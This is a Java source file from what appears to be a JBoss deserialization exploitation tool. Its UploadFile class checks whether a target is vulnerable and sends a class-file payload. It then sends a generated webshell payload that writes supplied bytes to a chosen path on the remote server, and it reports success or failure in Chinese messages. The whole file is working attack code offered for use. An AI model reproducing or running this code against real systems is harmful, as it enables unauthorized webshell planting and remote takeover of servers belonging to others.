package serializeTools.exploit.jboss;

import serializeTools.exploit.jboss.SendPayload;

public class UploadFile  {
	private static final UploadFile instance = new UploadFile();

	public static UploadFile getInstance() {
		return instance;
	}
	
	public String uploadFile(String targetUrl, String encoding, String filePath, byte[] bytes) throws Exception {
		
		
		String OS = "linux";
		byte[] result = null;
		byte[] payload = null;
		
		SendPayload sp = SendPayload.getInstance();
		GenClassFilePayload gcfp = new GenClassFilePayload();
		TrimCommandRes tcr = new TrimCommandRes();

		String chechResult = CheckVul.getInstance().isVulnerable(targetUrl, encoding);
		if (chechResult.indexOf("200|Vulnerable") >= 0) {			
			try {
				
				payload = gcfp.genClassFilePayload(OS);
				result = sp.sendPayloadAndGetResponse(targetUrl, payload);
				try{
					tcr.getObject(result);
				}catch (Exception e){
					return "返回数据解析失败4";
				}
			}catch (Exception e){
				return "网络连接失败:" + e.getMessage();
			}

			try {
				payload = GenWebshellPayload.getInstance().genWebshellPayload(filePath, bytes);
				result = sp.sendPayloadAndGetResponse(targetUrl, payload);
				try{
					tcr.getObject(result);
				}catch (Exception e){
					return "返回数据解析失败4";
				}
			
			}catch (Exception e){
				return "网络连接失败:" + e.getMessage();
			}
		}else{
			try {
				payload = GenWebshellPayload.getInstance().genWebshellPayload(filePath, bytes);
				result = sp.sendPayloadAndGetResponse(targetUrl, payload);
				try{
					tcr.getObject(result);
				}catch (Exception e){
					return "返回数据解析失败4";
				}
			}catch (Exception e){
				return "网络连接失败:" + e.getMessage();
			}
			
		}
		return "上传成功";
	}

}
